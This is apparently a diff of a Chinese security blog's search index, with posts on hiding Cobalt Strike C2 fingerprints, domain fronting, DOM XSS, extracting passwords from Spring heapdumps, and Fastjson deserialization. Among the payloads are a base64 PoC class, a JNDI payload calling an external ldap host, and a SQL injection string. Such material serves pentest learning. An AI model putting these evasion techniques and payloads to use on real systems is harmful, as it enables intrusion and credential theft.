@@ -15,17 +15,17 @@
 <h3 id="2-去除证书特征"><a href="#2-去除证书特征" class="headerlink" title="2.去除证书特征"></a>2.去除证书特征</h3><p>进入cs目录<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007592723678.jpg" alt="-w744"></p>
 <p>查看keytool -list -v -keystore cobaltstrike.store 证书情况，输入默认密码123456回车，可以看到所有者、发布者中Cobalt Strike相关字样。</p>
 <p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008655945864.jpg" alt="-w807"></p>
-<p><strong>keytool</strong>是一个Java 数据证书的管理工具，使用如下：<br>keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -alias google.com -dname “CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)</p>
+<p><strong>keytool</strong>是一个Java 数据证书的管理工具，使用如下：<br>keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -alias google.com -dname &quot;CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)</p>
 <p>example:<br><code>keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias google.com -dname &quot;CN=US, OU=google.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;</code></p>
 <p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008656484876.jpg" alt="-w821"></p>
 <p>未修改cobaltstrike.store前<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007653043551.jpg" alt="-w906"></p>
 <p>修改cobaltstrike.store后，可以看到cobalt strike等关键字样已经去除<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007654547114.jpg" alt="-w761"></p>
-<p>google.profile模版可以参考<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/">C2.profile</a>和<a href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.0.profile">malleable-c2</a><br>设置后，可以看到访问/image/后已经返回的是我们设置好的header 了<br>“Content-Type” “img/jpg”;<br>“Server” “nginx/1.10.3 (Ubuntu)”;</p>
+<p>google.profile模版可以参考<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/">C2.profile</a>和<a href="https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.0.profile">malleable-c2</a><br>设置后，可以看到访问/image/后已经返回的是我们设置好的header 了<br>&quot;Content-Type&quot; &quot;img/jpg&quot;;<br>&quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;;</p>
 <p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16007642149827.jpg" alt="-w1273"></p>
 <p>部分引用源码如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"># cs profile</span><br><span class="line">#   http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-the-comfoo-masters/</span><br><span class="line">#   https://github.com/rsmudge/Malleable-C2-Profiles/</span><br><span class="line"># Author: @keyi</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">set sample_name &quot;google&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/image/&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            netbios;</span><br><span class="line">            append &quot;-.jpg&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Content-Type&quot; &quot;img/jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;nginx/1.10.3 (Ubuntu)&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/history/&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/octet-stream&quot;;</span><br><span class="line">        header &quot;Referer&quot; &quot;http://www.google.com&quot;;</span><br><span class="line">        header &quot;Pragma&quot; &quot;no-cache&quot;;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;no-cache&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            netbiosu;</span><br><span class="line">            append &quot;.asp&quot;;</span><br><span class="line">            uri-append;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Content-Type&quot; &quot;img/jpg&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS/6.0&quot;;</span><br><span class="line">        header &quot;X-Powered-By&quot; &quot;ASP.NET&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="3-修改Cobalt-Strike-dns-idle"><a href="#3-修改Cobalt-Strike-dns-idle" class="headerlink" title="3.修改Cobalt Strike dns_idle"></a>3.修改Cobalt Strike dns_idle</h3><p>0.0.0.0是Cobalt Strike DNS Beacon特征可设置Malleable C2进行修改<br>输入set dns_idle “8.8.8.8”;</p>
+<h3 id="3-修改Cobalt-Strike-dns-idle"><a href="#3-修改Cobalt-Strike-dns-idle" class="headerlink" title="3.修改Cobalt Strike dns_idle"></a>3.修改Cobalt Strike dns_idle</h3><p>0.0.0.0是Cobalt Strike DNS Beacon特征可设置Malleable C2进行修改<br>输入set dns_idle &quot;8.8.8.8&quot;;</p>
 <hr>
 <h2 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
 <p>域前置（英语：<em>Domain fronting*），是一种隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过HTTP连接到白名单域名（如</em>.google.cn），无直接与C2服务器的通信。<br>介绍：被攻击机器 -&gt; <code>www.microport.com</code>(走aliyun cdn的域名，根据设定的host头: dns.google.cn找到对应的vps_ip) -&gt; cdn流量转发到vps_ip(c2真实地址)<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/09/23/16008630852868.jpg" alt="-w804"></p>
@@ -63,7 +63,7 @@ cs生成Windows exe，运行成功上线.可以看到14.17.67.46 东莞IP上线�
   <entry>
     <title>DOMXSS的一点研究</title>
     <url>/2021/02/22/DOMXSS/</url>
-    <content><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理解为html的节点，当前端参数可控制、并且可影响节点时候，形成domxss。<br>通常来讲domxss是属于前端的漏洞，通过前端的javascript代码获取传入的变量，形成xss漏洞。特点：不会与后端服务器进行交互。DOM XSS有何不同？我们可以观察到：HTML页面是静态的，并且与其他类型的XSS攻击一样，页面源代码中没有嵌入任何恶意脚本。如果使用＃字符，脚本代码将永远不会到达服务器。它被视为一个片段，浏览器不会转发它。因此，服务器端攻击检测工具将无法检测到此攻击。这里抛出一个疑问：如果一段domxss的payload可以保存在前端，并且储存到数据库中。比如在留言的地方插入domxss-payload，那么当我们点击这个留言的时候触发domxss，我们是否可以称它为存储型domxss呢？是不是颠覆了大家对xss的分类和认知了？–通常domxss被称为“javascript中输出数据到HTML页面”，domxss的分类在我眼里一直是一个谜。</p>
+    <content><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理解为html的节点，当前端参数可控制、并且可影响节点时候，形成domxss。<br>通常来讲domxss是属于前端的漏洞，通过前端的javascript代码获取传入的变量，形成xss漏洞。特点：不会与后端服务器进行交互。DOM XSS有何不同？我们可以观察到：HTML页面是静态的，并且与其他类型的XSS攻击一样，页面源代码中没有嵌入任何恶意脚本。如果使用＃字符，脚本代码将永远不会到达服务器。它被视为一个片段，浏览器不会转发它。因此，服务器端攻击检测工具将无法检测到此攻击。这里抛出一个疑问：如果一段domxss的payload可以保存在前端，并且储存到数据库中。比如在留言的地方插入domxss-payload，那么当我们点击这个留言的时候触发domxss，我们是否可以称它为存储型domxss呢？是不是颠覆了大家对xss的分类和认知了？--通常domxss被称为“javascript中输出数据到HTML页面”，domxss的分类在我眼里一直是一个谜。</p>
 <h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>domxss漏洞审计三步骤：漏洞的挖掘方式一般是从输入源或者输出点进行审计。通常我们是打开控制台，在console中对可以的关键函数进行输出，查看参数值是否可被控制，打断点进行调试。</p>
 <p>分析domxss的三大步骤：<br>输入源-编码-输出点<br>1.输入源(sources)：<br>location.href<br>lcoation.hash<br>location.search</p>
 <p>三个函数的作用域</p>
@@ -100,6 +100,27 @@ document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然�
       </tags>
   </entry>
   <entry>
+    <title>MAT 查找 spring heapdump 中的密码明文</title>
+    <url>/2020/08/25/SpringBootHeapdump/</url>
+    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
+<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
+<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
+<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
+<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">xray社区记一次信息泄漏到RCE</a></p>
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>黑盒测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CobaltStrike上线之钉钉提醒</title>
     <url>/2021/07/29/dingtalk_webhook/</url>
     <content><![CDATA[<blockquote>
@@ -125,6 +146,24 @@ document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然�
       </categories>
       <tags>
         <tag>工具开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>批量反编译class</title>
+    <url>/2017/05/26/fanbianiyi/</url>
+    <content><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar">fernflower.jar</a> 批量反编译class</strong></p>
+<p><strong>批量反编译</strong></p>
+<ul>
+<li>首先把工程的所有class压缩成classes.zip</li>
+<li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li>
+</ul>
+]]></content>
+      <categories>
+        <category>反编译</category>
+      </categories>
+      <tags>
+        <tag>java反编译工具</tag>
+        <tag>fernflower.jar</tag>
       </tags>
   </entry>
   <entry>
@@ -156,7 +195,7 @@ Fastjson可以将java的对象转换成json的形式，也可以用来将json转
 <p>首先编译poc得到字节码，然后用pyhton进行编码生成byte后的代码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin = open(r&quot;Poc.class&quot;, &quot;rb&quot;)</span><br><span class="line">fout = open(r&quot;en1.txt&quot;, &quot;w&quot;)</span><br><span class="line">s = base64.encodestring(fin.read()).replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>Poc1.class进行base64并且要替换换行’\n’, 后代码如下</p>
+<p>Poc1.class进行base64并且要替换换行&#39;\n&#39;, 后代码如下</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALcG9jMTExLmphdmEMAAgACQcAIQwAIgAjAQAMdG91Y2ggL3RtcC8xDAAkACUBAAZQb2MxMTEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACQAEAAoADQALAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAADgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAEAAAAJuwAFWbcABlexAAAAAQALAAAACgACAAAAFAAIABUADAAAAAQAAQAUAAEAFQAAAAIAFg==</span><br></pre></td></tr></table></figure>
 
@@ -201,10 +240,10 @@ Fastjson可以将java的对象转换成json的形式，也可以用来将json转
 <td>need Feature.SupportNonPublicField</td>
 </tr>
 </tbody></table>
-<h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>  1.目标站点如果报错的话一般使用不闭合{花括号或者多添加”双引号来进行测试</p>
-<p>  2.fastjson与jackson区别，如果请求包中的 json 如下:<br>    {“name”:”S”, “age”:21}<br>    追加一个随机 key ,修改 json 为<br>    {“name”:”S”, “age”:21,”agsbdkjada__ss_d”:123}<br>    这里 fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能 少不能多 key,<br>    所以会报错,服务器的响应包中多少会有异常回显</p>
-<p>  3.dos检测 dos<br>    {“a:”\x  看返回时间</p>
-<p>  4.如果是json字符串中name字段存在反序列化<br>    {“id”:”1”,”name”:”wangwei”}那么poc就是<br>    {“id”:”1”,”name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”x”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://fatjaon.tuq75v.ceye.io”,”autoCommit”:true}}</p>
+<h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>  1.目标站点如果报错的话一般使用不闭合{花括号或者多添加&quot;双引号来进行测试</p>
+<p>  2.fastjson与jackson区别，如果请求包中的 json 如下:<br>    {&quot;name&quot;:&quot;S&quot;, &quot;age&quot;:21}<br>    追加一个随机 key ,修改 json 为<br>    {&quot;name&quot;:&quot;S&quot;, &quot;age&quot;:21,&quot;agsbdkjada__ss_d&quot;:123}<br>    这里 fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能 少不能多 key,<br>    所以会报错,服务器的响应包中多少会有异常回显</p>
+<p>  3.dos检测 dos<br>    {&quot;a:&quot;\x  看返回时间</p>
+<p>  4.如果是json字符串中name字段存在反序列化<br>    {&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;wangwei&quot;}那么poc就是<br>    {&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;x&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://fatjaon.tuq75v.ceye.io&quot;,&quot;autoCommit&quot;:true}}</p>
 <p><strong>小tips</strong><br>1.在测试过程中发现只要回显比较慢，或者感觉卡顿都有可能是正在执行命令，所以比较慢<br>2.poc.java文件用低版本的java环境编译，因为java是向下兼容的，防止目标环境加载的时候运行报错，最好是jdk1.6</p>
 <h3 id="白盒审计函数"><a href="#白盒审计函数" class="headerlink" title="白盒审计函数"></a>白盒审计函数</h3><p>   1.查看fastjson jar包是否小于1.2.48<br>    2.审查以下函数<br>    JSON.parseObject（）<br>    JSONObject.parseObject（）<br>    JSON.parseAarry（）</p>
 <h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p><code>config.checkAutoType(typeName)</code></p>
@@ -217,45 +256,6 @@ Fastjson可以将java的对象转换成json的形式，也可以用来将json转
       </categories>
       <tags>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MAT 查找 spring heapdump 中的密码明文</title>
-    <url>/2020/08/25/SpringBootHeapdump/</url>
-    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
-<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
-<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
-<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
-<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
-<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">xray社区记一次信息泄漏到RCE</a></p>
-]]></content>
-      <categories>
-        <category>代码</category>
-      </categories>
-      <tags>
-        <tag>黑盒测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>批量反编译class</title>
-    <url>/2017/05/26/fanbianiyi/</url>
-    <content><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar">fernflower.jar</a> 批量反编译class</strong></p>
-<p><strong>批量反编译</strong></p>
-<ul>
-<li>首先把工程的所有class压缩成classes.zip</li>
-<li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li>
-</ul>
-]]></content>
-      <categories>
-        <category>反编译</category>
-      </categories>
-      <tags>
-        <tag>java反编译工具</tag>
-        <tag>fernflower.jar</tag>
       </tags>
   </entry>
   <entry>
@@ -272,9 +272,9 @@ Fastjson可以将java的对象转换成json的形式，也可以用来将json转
 <p>ServletContainerInitializer 也是 Servlet 3.0 新增的一个接口，容器在启动时使用 JAR 服务 API(JAR Service API) 来发现 ServletContainerInitializer 的实现类，并且容器将 WEB-INF/lib 目录下 JAR 包中的类都交给该类的 onStartup() 方法处理，我们通常需要在该实现类上使用 @HandlesTypes 注解来指定希望被处理的类，过滤掉不希望给 onStartup() 处理的类。</p>
 <p>一个典型的 servlet3.0+ 的 web 项目结构如下：<br>.<br>├── pom.xml<br>└── src<br>    ├── main<br>    │   ├── java<br>    │   │   └── moe<br>    │   │       └── cnkirito<br>    │   │           ├── CustomServletContainerInitializer.java<br>    │   │           ├── filter<br>    │   │           │   └── HelloWorldFilter.java<br>    │   │           └── servlet<br>    │   │               └── HelloWorldServlet.java<br>    │   └── resources<br>    │       └── META-INF<br>    │           └── services<br>    │               └── javax.servlet.ServletContainerInitializer<br>    └── test<br>        └── java</p>
 <p>注册方式一：servlet3.0注解+@ServletComponentScan<br>springboot 依旧兼容 servlet3.0 一系列以 @Web* 开头的注解：@WebServlet，@WebFilter，@WebListener</p>
-<p>@WebServlet(“/hello”)<br>public class HelloWorldServlet extends HttpServlet{}</p>
-<p>注册方式二：RegistrationBean<br>@Bean<br>public ServletRegistrationBean helloWorldServlet() {<br>    ServletRegistrationBean helloWorldServlet = new ServletRegistrationBean();<br>    myServlet.addUrlMappings(“/hello”);<br>    myServlet.setServlet(new HelloWorldServlet());<br>    return helloWorldServlet;<br>}</p>
-<p>@Bean<br>public FilterRegistrationBean helloWorldFilter() {<br>    FilterRegistrationBean helloWorldFilter = new FilterRegistrationBean();<br>    myFilter.addUrlPatterns(“/hello/*”);<br>    myFilter.setFilter(new HelloWorldFilter());<br>    return helloWorldFilter;<br>}</p>
+<p>@WebServlet(&quot;/hello&quot;)<br>public class HelloWorldServlet extends HttpServlet{}</p>
+<p>注册方式二：RegistrationBean<br>@Bean<br>public ServletRegistrationBean helloWorldServlet() {<br>    ServletRegistrationBean helloWorldServlet = new ServletRegistrationBean();<br>    myServlet.addUrlMappings(&quot;/hello&quot;);<br>    myServlet.setServlet(new HelloWorldServlet());<br>    return helloWorldServlet;<br>}</p>
+<p>@Bean<br>public FilterRegistrationBean helloWorldFilter() {<br>    FilterRegistrationBean helloWorldFilter = new FilterRegistrationBean();<br>    myFilter.addUrlPatterns(&quot;/hello/*&quot;);<br>    myFilter.setFilter(new HelloWorldFilter());<br>    return helloWorldFilter;<br>}</p>
 <h2 id="常见web-api框架"><a href="#常见web-api框架" class="headerlink" title="常见web-api框架"></a>常见web-api框架</h2><h3 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h3><p>webervice<br>    -soap<br>    -WSDL<br>    -UDDI<br>    -调用RPC与消息传递<br>    -restful接口<br>    -swagger<br>DWr<br>Hessian<br>GWT接口<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793279189535.jpg" alt="-w1141"></p>
 <h4 id="WEBSERVICE接口"><a href="#WEBSERVICE接口" class="headerlink" title="WEBSERVICE接口"></a>WEBSERVICE接口</h4><p>漏洞点<br>1.默认的安全配置<br>2.未授权的访问<br>3.自身未修复漏洞</p>
 <p>burp常见的样式，后缀是.wsdl<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793294814921.jpg" alt="-w429"><br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/24/15793295045371.jpg" alt="-w433"></p>
@@ -359,7 +359,7 @@ web.xml
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value=&quot;/ifUserExit&quot;,method = RequestMethod.GET)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">ifUserExit</span><span class="params">(Model model, HttpServletRequest request)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String phone = request.getParameter(<span class="string">&quot;phone&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(! phone.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">boolean</span> ifex=userModel.ifuserExitByPhone(phone);</span><br><span class="line">        <span class="keyword">if</span> (!ifex)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;用户不存在&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;用户已被注册&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><strong>信息泄露</strong><br>js中搜索<br>ip，密码，账号，测试账号，137，139，用户，ftp配置,192.168,  10.  http， https</p>
 <p>预编译<br>SELECT * From table_name WHERE name=‘XX’ and password=‘YY’ and corporate=‘ZZ’</p>
-<p>添加 ‘ or 1=1 -<br>SELECT * From table_name WHERE name=’’ and password=’’ and corporate=’’ or 1=1-‘<br>使用预编译后会吧后边当做一个整体</p>
+<p>添加 &#39; or 1=1 -<br>SELECT * From table_name WHERE name=’’ and password=’’ and corporate=&#39;&#39; or 1=1-&#39;<br>使用预编译后会吧后边当做一个整体</p>
